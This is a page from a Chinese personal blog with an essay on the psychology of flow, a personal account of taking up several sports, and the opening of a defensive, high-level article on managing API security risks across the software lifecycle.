+<h2 id="心流"><a href="#心流" class="headerlink" title="心流"></a>心流</h2><p>对于心流的定义有很多种，我最欣赏这个定义，“沉浸于事物本身，这就是心流。”</p>
+<p>就是当你特别专注地做一件目标明确而又有挑战的事情，而你的能力恰好能接住这个挑战时，你可能会进入的一种状态。它的特征是你做这件事的时候会忘记自己，忘记时间的流逝，你能体察到所有相关的信息，不管工作多复杂你都毫不费力，而且有强烈的愉悦感。</p>
+<p>这个过程可以理解为精神世界的负墒，最典型、最壮丽也最奇妙的负熵过程就是这个宇宙的最大奇迹——生命，从无序到有序。从这个角度来说，心流就是大脑的生命。当心熵比较高的时候，在一片混乱的情况下，大脑的做功能力很低，很多心理能量都浪费在内耗上了。但一旦进入心流状态，心理能量就围绕着同一个主题组织起来，向同一个方向高效率地输出。这也就是契克森米哈赖反复强调的，人在心流状态下的表现最好。</p>
+<p>“首先，这种体验出现在我们面临一份可完成的工作时。</p>
+<p>其次，我们必须能够全神贯注于这件事情。</p>
+<p>第三，明确的目标.</p>
+<p>第四，即时的反馈。</p>
+<p>第五，我们能深入而毫不牵强地投入到行动之中，日常生活的忧虑和沮丧都因此一扫而空。</p>
+<p>第六，充满乐趣的体验使人觉得能自由控制自己的行动。</p>
+<p>第七，进入“忘我”状态，但心流体验告一段落后，自我感觉又会变得强烈。</p>
+<p>第八，时间感会改变——几小时犹如几分钟，几分钟也可能变得像几小时那么漫长。这些元素结合成一种深刻的愉悦感，带来无比的报偿，并扩展成极大的能量，仅是感觉它的存在就已值回“票价”了。”</p>
+<p>最简单的理解，有些人习惯信笔涂鸦，有些人咀嚼东西或抽烟、梳头发、哼曲子，目的无非是通过有规律的行动，把意识规范得更有秩序。这些活动是一种“小型心流”，可以帮助我们度过日常生活的低潮。</p>
+<p>进入心流状态后，“当事人全神贯注，一切动作都不假思索，几乎完全自动自发；他们的知觉甚至泯灭，人与行动完全合一。”“在日常生活中，我们经常被怀疑或疑问打断：“我为什么这么做？我是否该做这件事？”我们一再追问行动的必要性，并批判它们背后的理由。然而在心流中没有反省的空间，所有行动宛如一股魔力，带着我们勇往直前。”</p>
+<p>“最常述及的心流体验的特征就是，在心流中会把生活中所有不快乐的事忘得一干二净。这是因为要想从活动中汲取乐趣，必须全心全意地专注于手头的工作，所产生的重要副产品——心流状态下的心灵完全没有容纳不相干资讯的余地。”</p>
+<p>“体育具备造就心流的最佳条件：明确的目标，即时的回馈，易学难精带来的上不封顶的挑战性。体育的最大功能是帮助人控制自己：既学习控制自己的身体——这很好理解，体操、田径、游泳、球类，都要在控制身体上下大功夫，又要学习控制自己的精神，控制自己的注意力。”</p>
+<p>“冒险专家的乐趣并非来自危险本身，而是来自他们使危险降至最低的能力。真正令他们乐此不疲的，不是追逐危险的病态悚栗，而是一种有办法控制潜在危险的感觉。”</p>
+<p>“一位骄傲的作家用字与词创造一个令人沉浸的世界。在这个过程中，他不断挑战自我。就像海明威一样，三十岁的时候，人们以为《战地春梦》就是他的最高水准了；然而，他又用了二十多年锤炼手艺，直到巅峰之作《老人与海》问世。海明威的大半生，一直用写作催生心流涓涓不断。在这个硬汉世界中，他是唯一的君王。直到有一天，世界失控，沙堆崩溃。”</p>
+<h2 id="人生目标"><a href="#人生目标" class="headerlink" title="人生目标"></a>人生目标</h2><p>人生目标的获得不能抄袭，没有捷径。米哈里说：获得最优体验的手段，“不能浓缩成一个秘诀，也不能背诵下来重复使用……每个人必须自行从不断的尝试与错误中学习”。米哈里问读者：什么是自得其乐？他自己的回答是：“就是‘拥有自足目标的自我’，大多数人的目标都受生理需要或社会传统的制约，亦即来自外界。自得其乐的人，主要目标都从意识评估过的体验中涌现，并以自我为依据。”外界向你提供目标时，往往以某种奖励吸引你追随它。世上大多数奖励的动机是控制你</p>
+<p>在讨论心流与目标时，米哈里还提出了“自成目标”的概念，即目标是做你喜欢做的事情，而非做这件事情的报酬，尽管有时也存在报酬，有时也有社会效益。也就是为艺术而艺术，为科学而科学，为你喜欢的劳作而劳作。米哈里说：“开始时靠目标证明努力的必要，到后来却变成靠努力证明目标的重要性。”“登上山顶之所以重要，只因它证明了我们爬过山，爬山的过程才是真正的目标。”</p>
+<p>“痛下决心追求一个重要的目标，各式各样的活动都能汇集成统一的心流体验时，意识就呈现出一片祥和。知道自己要什么，并朝这个方向努力的人，感觉、思想、行动都能配合无间，内心的和谐自然涌现。生活在和谐之中的人，不论做什么、遭遇什么，都不会把精神能量浪费在怀疑、后悔、罪恶感及恐惧之上，精力永远用在有益的方面。对生命胸有成竹的人，内心的力量与宁静，就是内在一致的最高境界。方向、决心加上和谐，就能把生命转变成天衣无缝的心流体验，并赋予人生意义。达到这种境界的人再也不觉得匮乏。意识井然有序的人不需要害怕出乎意料的事，甚至也不惧怕死亡，活着的每一刻都饶富意义，大多数时候也都乐趣无穷。”</p>
+<p>首先要找到一个终生的目标，其次不要害怕复杂性，这就是对你人生意义的挑战，而你可以应对的技能是“行动式生活”与“反省式生活”相结合。最终，你既有独特的个人特性，又与周围世界、人们所整合，“只要个人目标与宇宙心流汇合，意义的问题也就迎刃而解了”。</p>
+<p>但是正如文中所说：“伟大的音乐、建筑、艺术、诗歌、戏剧、舞蹈、哲学、宗教，都是以和谐克服混沌的好榜样”。降熵过程有高下，美有高下，技艺有高下，心流也有高下。原本的混沌越多，整合进去的元素越复杂，这个心流就越伟大。那么，自然，人生意义也有高下。那些能够整合无比复杂的人生、找到人生意义，整合无比复杂的世界、形成自己的世界观，整合无比复杂经常是相对矛盾的价值观、形成自己的价值观的人，有最大的“大心流”。</p>
+<p>文中所推崇的人生最优体验，不是幸福、快乐这点肤浅的感受，而是奋斗、挣扎、咬牙坚持，最终，是整合之后的巅峰体验。这才是心流的真意。</p>
+<h2 id="进入心流"><a href="#进入心流" class="headerlink" title="进入心流"></a>进入心流</h2><p>“最典型的例子就是冥想。佛家经常用冥想来降伏内心那瀑布一样奔腾如雷的念头。在冥想中，你摒除杂念，心灵澄净，如一道清澈的心流。经过长期练习之后，哪怕不在冥想之中，你的心灵也会比常人更平静，遇到意外变故时能更快地集中注意力。换句话说，你的心熵整体降低了。”</p>
+<p>高僧冥想多年才能达到波澜不惊，我亦很难进入心流状态，待到可以稳定进入心流之时，再来补充这最后一章节。</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sun Dec 12 2021 00:50:00 GMT+0800">2021-12-12</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/">胡思乱想</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E8%8E%AB%E5%90%91%E5%A4%96%E6%B1%82%EF%BC%8C%E5%8F%8D%E6%B1%82%E8%AF%B8%E5%B7%B1/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E8%BF%90%E5%8A%A8%E7%AF%87%EF%BC%9A2021%E5%BC%80%E6%9D%BF&%E8%81%8A%E8%81%8A%E8%BF%90%E5%8A%A8/">
+                        运动篇：2021开板&amp;聊聊运动
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        
+
+趁着人体机能由盛转衰的这几年，学会了几项新的运动，改变了一点对自己“运动白痴”的看法，发现自己还是蛮强的，哈哈哈
+
+
+游泳游泳是我前二十几年的痛，小时候两次下水的不友好经历，让我不敢再去碰水。来浙江这地方后，发现处处是水，北方人哪见过这么多水，整天杞人忧天，想着万一洪水了怎么办……在求生的欲望下，终于下定决心去学游泳。
+说起游泳还是挺自豪的，游泳是自学的，记得当初仅仅去了三次浅水区，就敢去深水区游了，虽然第一次下深水区并不优雅…..
+自学是跟着B站大佬“梦觉教游泳”的蛙泳教程开始的
+在去游泳馆之前的一周，每天回家就趴在床上或在镜子前练习标准动作，练到有一定肌肉记忆后，然后下水找感觉，喝了不少水，emmmm
+现在水平嘛，就会个蛙泳，还有踩水，50米的深水区可以一次游800米左右吧，体力有限，接下来的心愿就是学习下自由泳、蝶泳。
+徒步/爬山说起这爬山，我内心其实是非常抗拒，之前的想法总是，周末躺尸这么爽，为啥要虐自己……
+直到和朋友们爬了亚丁·稻城看了五色海、走了武功山两天一夜穿越线后，现在甚至有点上瘾。
+回想起稻城，去之前还以为是个观光看大片麦浪的地方，到那一看，高原还要爬山，腿软……整了两个氧气瓶就冲了，当天雨下的还挺大的，在缺氧状态下寒风刺骨，也没有太多的氧气给脑子去胡思乱想，七八公里吧，平路也就两个小时，当时愣是整了一天，咬牙一步一步向上挪……登顶后终于看到了五色海（一个灰蒙蒙的湖，网上都是骗人的）
+再就是武功山穿越，号称户外的毕业路线，南武功，北鳌太。网上都是各种说高山草甸多么多么美，说实话，确实挺美的，国庆前后去最好时节。这条路线的强度怎么说呢，对我这种弱鸡来说是地狱级别，三四十公里吧，有人说是要翻过25个山头，反正我当时只想着，爬过这个山头歇一歇，山路基本都是徒步爱好者踩出来，基本没啥基础设施，就中间山顶有个铁皮木房子，可以不用住帐篷过夜。
+这条路对于我这种新手，就是非常的虐，但是人这种生物总是有点不正常，走的时候发誓再也不去了，结束的时候反倒还想再来一次。
+其他的路线和这两个比起来就是小打小闹了。
+骑行从小就挺喜欢骑车的，来这边后，整了辆大行P8通勤，还有一辆Trek碳车去竞速。这项运动是真烧钱，当初各种压抑自己欲望，一套下来都两个多W了，后边各种升级，一个车轮就得几K，更别说换车了，每年出来新车，就馋的流哈喇子，有些车友一辆车都十几个W，重量在八九千克，单手轻松提溜起来，时速能达到上百公里……就是真的是无底洞。
+当前刚拿到车，在小区里用了半个多小时学会了上锁，第二天就报名了一条不归路“林峰山-安顶山穿越”，全程140公里，山头也有几十个吧，许多坡陡的走路都很艰难，更别说蹬上去了……到现在都不想过于回忆这条路线，只记得两个事情，在这里达到了骑车生涯中的最高速——70km/h，感觉生死走了一趟，另外就是实现了第一摔，从这之后，下坡再也不敢野了，安全第一。
+然后过了几个月，又跟着车队骑了一次，人果然是一种不会记住历史的生物，不出意外，又是一次血虐……之后就再也不骑这条路线了（不过推荐给了好多骑友，哈哈哈）
+有一说一，浙江这地方，一年之中真正适合骑车的日子没多少，然后到处修路，加上很多事情都delay了，现在已经很少骑车了。车子在卧室旁边，每每看到都觉得对不起它，哎……
+滑雪这东西被叫做“白色鸦片”，真不是瞎说，有点上瘾，这不桐庐刚开了半个初级道，就冲了……
+单板和双板之间选择的话，比较推荐单板，可玩性很高，安全，飘逸，总结下就是帅（摔起来就很难看了），唯一的缺点大概就是入门难度比较高了。
+现在自己的单板基本就像视频里，经历了推坡、落叶飘、换刃后，S滑行还是不太连贯，花滑不会，昨天在初级坡上练了下，摔得够呛，四个小时差不多不到二十趟，腰酸背疼……
+现在自己顶多算个初级入门，能从中级道没有太多花样的情况下滑下来不摔，连续S滑行有时太快了容易摔。
+冬天来了，抓住机会多滑几次……
+羽毛球小白。（拍子持续吃灰中）
+明明可以抱教父大腿好好学一下，失去了才知道……
+后边有时间报个教练吧，打过几次感觉羽毛球挺有意思的。
+跑步跑步最大的好处应该就是不限制场地吧，然而这是我从小的弱项，一千米永远都是噩梦。
+后来通过骑行，耐力有了一点点的提升，现在勉强可以保持在4公里左右，太难了。
+这次双十一被怂恿搞了双“kayano 28”，然而再强的装备也扶不起来阿斗，emmmm
+立一个flag，三年内跑一次半马（大不了上收容车……）
+健身/撸铁
+从囚徒健身到后来健身房，三天打鱼，两天晒网的，断断续续也快10年了，当初奔着增肌长肉去的，然而这么些年过去了，体重没有一点变化，力量倒是蹭蹭的往上长，真不知道是个好事还是坏事。
+不过现在也想明白了，健身是为了啥，还不是健康，胖瘦都无所谓了。
+安全第一危险性的运动一定要保护好自己，就像昨天滑雪，虽然只是个初级道，速度也不快，但是谁能保证身后没有“人肉炸弹”呢，也许是我太谨慎了，给自己包裹的严严实实。
+运动的意义自己的身体状态真的很迷，一旦有一段时间不锻炼，整个人的状态就会很快速的下滑，没有精神，睡不醒。这种情况下强迫自己去跑几次，状态就很快恢复回来了。现在中午都会抽时间去跑一下，几公里下来，整个下午就跟打了鸡血，像之前午睡起来后只想一件事，那就是继续睡……
+焦虑这个东西，大家现在应该或多或少都会有，我有一段时间频繁失眠，然后第二天没有状态，恶性循环了老长一段时间，后来就是强迫自己去撸铁才恢复到正常状态。当高速骑行、滑行的时候，整个人的精神是高度集中在当前事物上的，可以理解为进入了运动的心流，这时脑子中的杂念都会消失的无影无踪，这个过程中真的是非常的舒服。
+其实还有一个，那就是灾难来了的时候能多一丝希望，无论是疫情、洪水还是地震、战争，当有一个好的身体，逃生起来也是有利的。
+
+
+在回来的大巴上用手机断断续续手敲的，没啥逻辑，随便看看就好。
+
+
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <blockquote>
+<blockquote>
+<p>趁着人体机能由盛转衰的这几年，学会了几项新的运动，改变了一点对自己“运动白痴”的看法，发现自己还是蛮强的，哈哈哈</p>
+</blockquote>
+</blockquote>
+<h2 id="游泳"><a href="#游泳" class="headerlink" title="游泳"></a>游泳</h2><p>游泳是我前二十几年的痛，小时候两次下水的不友好经历，让我不敢再去碰水。来浙江这地方后，发现处处是水，北方人哪见过这么多水，整天杞人忧天，想着万一洪水了怎么办……在求生的欲望下，终于下定决心去学游泳。</p>
+<p>说起游泳还是挺自豪的，游泳是自学的，记得当初仅仅去了三次浅水区，就敢去深水区游了，虽然第一次下深水区并不优雅…..</p>
+<p>自学是跟着B站大佬“梦觉教游泳”的蛙泳教程开始的</p>
+<p>在去游泳馆之前的一周，每天回家就趴在床上或在镜子前练习标准动作，练到有一定肌肉记忆后，然后下水找感觉，喝了不少水，emmmm</p>
+<p>现在水平嘛，就会个蛙泳，还有踩水，50米的深水区可以一次游800米左右吧，体力有限，接下来的心愿就是学习下自由泳、蝶泳。</p>
+<h2 id="徒步-爬山"><a href="#徒步-爬山" class="headerlink" title="徒步/爬山"></a>徒步/爬山</h2><p>说起这爬山，我内心其实是非常抗拒，之前的想法总是，周末躺尸这么爽，为啥要虐自己……</p>
+<p>直到和朋友们爬了亚丁·稻城看了五色海、走了武功山两天一夜穿越线后，现在甚至有点上瘾。</p>
+<p>回想起稻城，去之前还以为是个观光看大片麦浪的地方，到那一看，高原还要爬山，腿软……整了两个氧气瓶就冲了，当天雨下的还挺大的，在缺氧状态下寒风刺骨，也没有太多的氧气给脑子去胡思乱想，七八公里吧，平路也就两个小时，当时愣是整了一天，咬牙一步一步向上挪……登顶后终于看到了五色海（一个灰蒙蒙的湖，网上都是骗人的）</p>
+<p>再就是武功山穿越，号称户外的毕业路线，南武功，北鳌太。网上都是各种说高山草甸多么多么美，说实话，确实挺美的，国庆前后去最好时节。这条路线的强度怎么说呢，对我这种弱鸡来说是地狱级别，三四十公里吧，有人说是要翻过25个山头，反正我当时只想着，爬过这个山头歇一歇，山路基本都是徒步爱好者踩出来，基本没啥基础设施，就中间山顶有个铁皮木房子，可以不用住帐篷过夜。</p>
+<p>这条路对于我这种新手，就是非常的虐，但是人这种生物总是有点不正常，走的时候发誓再也不去了，结束的时候反倒还想再来一次。</p>
+<p>其他的路线和这两个比起来就是小打小闹了。</p>
+<h2 id="骑行"><a href="#骑行" class="headerlink" title="骑行"></a>骑行</h2><p>从小就挺喜欢骑车的，来这边后，整了辆大行P8通勤，还有一辆Trek碳车去竞速。这项运动是真烧钱，当初各种压抑自己欲望，一套下来都两个多W了，后边各种升级，一个车轮就得几K，更别说换车了，每年出来新车，就馋的流哈喇子，有些车友一辆车都十几个W，重量在八九千克，单手轻松提溜起来，时速能达到上百公里……就是真的是无底洞。</p>
+<p>当前刚拿到车，在小区里用了半个多小时学会了上锁，第二天就报名了一条不归路“林峰山-安顶山穿越”，全程140公里，山头也有几十个吧，许多坡陡的走路都很艰难，更别说蹬上去了……到现在都不想过于回忆这条路线，只记得两个事情，在这里达到了骑车生涯中的最高速——70km/h，感觉生死走了一趟，另外就是实现了第一摔，从这之后，下坡再也不敢野了，安全第一。</p>
+<p>然后过了几个月，又跟着车队骑了一次，人果然是一种不会记住历史的生物，不出意外，又是一次血虐……之后就再也不骑这条路线了（不过推荐给了好多骑友，哈哈哈）</p>
+<p>有一说一，浙江这地方，一年之中真正适合骑车的日子没多少，然后到处修路，加上很多事情都delay了，现在已经很少骑车了。车子在卧室旁边，每每看到都觉得对不起它，哎……</p>
+<h2 id="滑雪"><a href="#滑雪" class="headerlink" title="滑雪"></a>滑雪</h2><p>这东西被叫做“白色鸦片”，真不是瞎说，有点上瘾，这不桐庐刚开了半个初级道，就冲了……</p>
+<p>单板和双板之间选择的话，比较推荐单板，可玩性很高，安全，飘逸，总结下就是帅（摔起来就很难看了），唯一的缺点大概就是入门难度比较高了。</p>
+<p>现在自己的单板基本就像视频里，经历了推坡、落叶飘、换刃后，S滑行还是不太连贯，花滑不会，昨天在初级坡上练了下，摔得够呛，四个小时差不多不到二十趟，腰酸背疼……</p>
+<p>现在自己顶多算个初级入门，能从中级道没有太多花样的情况下滑下来不摔，连续S滑行有时太快了容易摔。</p>
+<p>冬天来了，抓住机会多滑几次……</p>
+<h2 id="羽毛球"><a href="#羽毛球" class="headerlink" title="羽毛球"></a>羽毛球</h2><p>小白。（拍子持续吃灰中）</p>
+<p>明明可以抱教父大腿好好学一下，失去了才知道……</p>
+<p>后边有时间报个教练吧，打过几次感觉羽毛球挺有意思的。</p>
+<h2 id="跑步"><a href="#跑步" class="headerlink" title="跑步"></a>跑步</h2><p>跑步最大的好处应该就是不限制场地吧，然而这是我从小的弱项，一千米永远都是噩梦。</p>
+<p>后来通过骑行，耐力有了一点点的提升，现在勉强可以保持在4公里左右，太难了。</p>
+<p>这次双十一被怂恿搞了双“kayano 28”，然而再强的装备也扶不起来阿斗，emmmm</p>
+<p>立一个flag，三年内跑一次半马（大不了上收容车……）</p>
+<p>健身/撸铁</p>
+<p>从囚徒健身到后来健身房，三天打鱼，两天晒网的，断断续续也快10年了，当初奔着增肌长肉去的，然而这么些年过去了，体重没有一点变化，力量倒是蹭蹭的往上长，真不知道是个好事还是坏事。</p>
+<p>不过现在也想明白了，健身是为了啥，还不是健康，胖瘦都无所谓了。</p>
+<h2 id="安全第一"><a href="#安全第一" class="headerlink" title="安全第一"></a>安全第一</h2><p>危险性的运动一定要保护好自己，就像昨天滑雪，虽然只是个初级道，速度也不快，但是谁能保证身后没有“人肉炸弹”呢，也许是我太谨慎了，给自己包裹的严严实实。</p>
+<h2 id="运动的意义"><a href="#运动的意义" class="headerlink" title="运动的意义"></a>运动的意义</h2><p>自己的身体状态真的很迷，一旦有一段时间不锻炼，整个人的状态就会很快速的下滑，没有精神，睡不醒。这种情况下强迫自己去跑几次，状态就很快恢复回来了。现在中午都会抽时间去跑一下，几公里下来，整个下午就跟打了鸡血，像之前午睡起来后只想一件事，那就是继续睡……</p>
+<p>焦虑这个东西，大家现在应该或多或少都会有，我有一段时间频繁失眠，然后第二天没有状态，恶性循环了老长一段时间，后来就是强迫自己去撸铁才恢复到正常状态。当高速骑行、滑行的时候，整个人的精神是高度集中在当前事物上的，可以理解为进入了运动的心流，这时脑子中的杂念都会消失的无影无踪，这个过程中真的是非常的舒服。</p>
+<p>其实还有一个，那就是灾难来了的时候能多一丝希望，无论是疫情、洪水还是地震、战争，当有一个好的身体，逃生起来也是有利的。</p>
+<blockquote>
+<blockquote>
+<p>在回来的大巴上用手机断断续续手敲的，没啥逻辑，随便看看就好。</p>
+</blockquote>
+</blockquote>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sun Dec 05 2021 21:00:00 GMT+0800">2021-12-05</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/">胡思乱想</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E8%BF%90%E5%8A%A8%E7%AF%87%EF%BC%9A2021%E5%BC%80%E6%9D%BF&%E8%81%8A%E8%81%8A%E8%BF%90%E5%8A%A8/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/API%E5%AE%89%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/">
+                        API安全生命周期
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        写在前面本文的由来主要是最近一年来对内部API风险治理过程中的总结。因为API的种类繁多，并没有写的很详细，但是在其中表达了很多API治理的思路和经验总结。在WAF、黑白盒扫描器、RASP越来越成熟的今天，API导致的逻辑类风险将是各公司面临的最大难题，希望本文可以给予同行者们一些帮助。
+一、什么是API应用编程接口（API）由一组用于集成应用软件和服务的工具、定义和协议组合而成 https://www.redhat.com/zh/topics/api 。设计方式主要遵循SOAP协议或者REST架构。SOAP和REST的关系此处不在赘述，详情可以看https://www.redhat.com/zh/topics/integration/whats-the-difference-between-soap-resth。 
+API 既可以私有（仅供内部使用），也可以合用（与特定合作伙伴共享以创造更多收益）或公用（允许第三方开发的应用能与您的API 交互，从而推动创新）。
+在大多数情况下，企业会采用微服务架构，想要通过加速软件开发来满足需求。基于 HTTP 的 API 已成为微服务架构之间同步交互的首选方法。因为它们可以降低部署、可扩展性和维护的复杂性和开销。这些 API 是将所有微服务连接在一起的粘合剂。API被广泛的应用在各种业务中，也导致大量不规范的API发布到线上，将风险暴露在攻击者的视线中。
+二、API生命周期生命周期就是指一个对象的生老病死。其实所有的非瞬时性的对象都有着自己的生命周期，诞生-存在-消亡。
+￼
+那结合我们的实际经验，可以总结出API的生命周期，设计-开发-测试-上线-运行-迭代-下线。
+￼
+三、API安全生命周期1. API面临的主要网络攻击在聊API安全生命周期之前，首先我们要思考一下，API会遇到哪些攻击。API作为业务的表达，承载着大量的数据和生产资料，主要的攻击主要包括以下几种：
+
+失陷的访问控制 “失陷的访问控制”也就是常说的“越权”，荣登OWASP 2021的Top 1。API的访问控制失效，攻击方可直接调用API进行增删改查操作，造成数据泄漏或者生产中断。在有一定安全水位的企业里，越权漏洞一定是高危漏洞种类的重要组成。
+
+数据泄漏(敏感数据暴露、加密失败)   数据泄漏风险可以说是现在企业面临的最高网络攻击风险了，主要的泄漏途径除了被入侵拖库，就是API的数据过度透出、访问控制缺陷导致被批量调用泄漏数据。随着现在大公司的网络边界安全水位越来越高，被入侵拖库的难度已经非常大了，但是不规范的API暴露的数据泄漏敞口仍然是非常之多。
+
+Web网络攻击   针对API的Web网络攻击主要包括DDoS攻击、注入攻击等等。这类传统web攻击类型作为一类，它们的共同点就是可以通过一定的策略进行拦截。
+
+
+2. API生命周期中的安全上面讲的都是外部的网络攻击威胁，但产生这些风险的原因都是内因，我们顺着API生命周期来看每一个环节中缺少的安全部分以及难点。
+￼￼
+1. 设计阶段绝大部分开发同学都想开发出安全和可靠的API，但是在设计之初以及开发过程中，因为自身对风险的整体认知不足，往往很难做到完善可靠的安全设计。在设计阶段，产品、开发等会多次对焦需求和设计方案，但是往往安全的角色在这里是缺席的。
+理想情况下，如果每个API的设计阶段都有安全工程师参与其中对其进行威胁建模，那线上的API风险将会大大减少。但是我们都知道，在 安全:开发 = 1:1000 的现状下，人工覆盖每个API的威胁建模将永远是一个美好的想象。
+安全部分：
+将威胁建模加入到API设计阶段，给出可能发生的风险解决建议和方案。
+实施难点：
+安全工程师在公司中的人数往往比较少，难以人工覆盖。
+实现建议：
+建设自动化威胁建模能力，同时对业务进行分层。采用“重点业务人工评审”和“非重点业务自动化威胁建模”相结合的方式，可以有效的对核心高风险接口进行覆盖。在过去半年里，我们在公司内部落地了这个思路，效果非常明显。
+2. 开发阶段开发过程中，安全基本没有机会参与其中，能做的大概就是提供API安全开发规范、安全开发插件、安全辅助包等辅助性安全开发工具。是否使用，全看开发同学的安全意识以及开发项目的紧迫程度。
+再一个有用的则是白盒代码扫描，嵌入到CI/CD流程中，发布到测试环境时就进行扫描。但是白盒代码扫描的弊端也很明显，对于逻辑类的风险，目前尚未有很好的检测工具，API是否包含敏感数据也很难判断。
+安全部分：
+
+API安全开发规范、安全开发插件、安全辅助包
+嵌入到CI/CD流程中的白盒代码扫描工具
+
+实施难点：
+如何让开发人员将这些安全辅助工具用起来是个挑战，安全意识培养在于一点一滴的积累。
+实现建议：
+白盒代码扫描实现越权等逻辑类漏洞的检测，在我看来是未来最有可能有效解决逻辑类漏洞的方向之一。但是到现在尚未看到有准确率高、可大规模覆盖使用的产品出现。不过各个公司内部应该都在进行着类似的实现，期待。
+3. 测试阶段如果利用得当，测试阶段将是保证API安全上线的一个关键环节。无论是自动化测试流程还是人工测试，都会对API的业务逻辑实现、稳定性等进行策略，越重要的业务覆盖的越全面。如果在测试的CheckList中加入API相关的内容，则可以接入测试的能力发现API的安全问题。
+在这里有一个关键问题，那就是API安全漏洞是否属于bug，例如API的权限校验失效，是否应该算进未被发现的bug数量中。这个共识如果可以达成，那接下来就可以去讨论如何合作了，无论是嵌入到自动化测试平台或者人工测试的CheckList中。在笔者看来，这个共识并不是很难达成，当然这也要看生产关系是怎样的。
+安全部分：
+与测试团队达成共识，API安全漏洞等于BUG，在此基础上，结合已有的基础设施进行合作，与测试团队共同在上线前发现API的安全风险。
+实施难点：
+
+测试团队的工作往往也比较饱和，要想达成共识最好能从上到下进行
+测试团队人员的安全专业能力往往欠缺，需要安全团队给予安全能力培训或者提供安全工具辅助发现安全风险
+
+实现建议：
+主要还是三个要点：与测试团队达成共识、提供自动化的测试工具以及提高测试同学的安全专业能力。
+4. 上线阶段API发布上线阶段是最关键的环节之一。如果API的漏洞在设计、开发、测试环节中没有被发现，那这将是最后的机会去阻止漏洞产生了，一旦发布到线上，那就只能和攻击者赛跑了。
+到这个阶段，理论上传统Web漏洞应该已经都被黑白盒漏洞扫描工具发现出来了，如果还没有，那就很难发现了。但是API权限和API数据相关的漏洞在上线阶段是很容易被安全同学挖掘出来的，不过这里也存在一个人力分配的情况。根据笔者的经验，在这个阶段将有限的安全人力投入到高风险的资产中是最具性价比的。什么样的API是高风险的呢？涉及敏感信息的、涉及资金的、涉及核心基础设施操作的，等等，与设计阶段的评审一样，分层治理。
+安全部分：
+通过建设自动化发现高风险API能力，例如通过测试流量识别敏感数据API等，对高风险API进行人工安全上线评审，将高危API漏洞拦截在上线前。
+实施难点：
+主要的难点应该是如何发现高风险的“影子资产”API，在聚光灯的API资产，出现风险的概率往往比较低，但是那些不在我们视线中的API，往往因为没有经过安全评审，产生严重的漏洞。业务、应用越多，“影子资产”API也会越多，如果对API资产进行全面的覆盖、管理，是一个非常有意义且重要的题目。
+实现建议：
+可以先从流量、日志入手，找到测试环境的流量，通过其识别哪些资产属于高风险资产，“影子资产”API的发现也可以类似的方式持续发现。
+5. 运行阶段运行阶段，API风险往往已经暴露在互联网，随时可能被攻击利用。这个节点的重心要做两件事，API被攻击情况的监控以及API漏洞的持续巡检。
+API被攻击情况的监控：例如通过WAF监控阻断SQL注入请求、通过防爬拦截掉尝试利用API越权漏洞获取数据的请求、通过UEBA发现利用自身权限批量获取敏感数据的行为等等。主要的监控能力需要具备WAF拦截、DDoS防御、爬虫拦截、用户异常行为检测等。
+安全部分：
+通过流量安全监控平台对风险进行检测、阻断，同时结合完善的应急响应流程，对攻击事件进行处置。
+实施难点：
+
+数据窃取类流量和真实业务流量相似度较高，通过传统的规则策略发现难度较大
+内部人员利用API获取数据的检测难度大
+
+实现建议：
+购买或者自研各类监控平台，对高风险API进行重点监控，同时针对各种类型的API风险，制定完善可靠的应急SOP。
+6. 迭代阶段这个阶段可能是最令人头疼的了，即便是这个API上线时经过各种扫描、评审，确定没有安全风险了，后边随着业务需求变化发生改动，就很容易产生新的风险，特别是当开发人员认为前期已经做过非常多的安全检测后，不太可能再出问题时。
+安全部分：
+
+需要我们建设响应的API迭代发现能力，当API发生高风险迭代时，介入安全评审流程。
+
+实施难点：
+
+当API发生迭代后，API的名称和API的参数可能并不会发生变化，却在返回值中透出了敏感数据
+
+实现建议：
+
+监控API的返回值，当历史API的返回值中新增敏感数据时，介入安全评审
+监控代码仓库变更，当发现API方法代码发生变更时，介入安全评审
+监控历史API的名称、入参等，当发生变化时，介入安全评审
+
+7. 下线阶段大量的API在完成自己的使命后，没有被及时下线，不仅会浪费系统资源，还会变成潜在的线上风险。例如一个API存在越权漏洞，但是因为没有流量一直没有被发现，直到有一天被攻击者利用。
+安全部分：
+
+需要我们针对该下线未下线的API建立API生命周期流程管理，催动无流量API下线。
+
+实施难点：
+
+如何识别哪些API是应该下线的，部分API在特殊业务场景下，可能在一年中只会使用几次，这部分要单独维护
+
+实现建议：
+
+监控API的流量变化，对一段时间内无流量的API启动下线流程
+
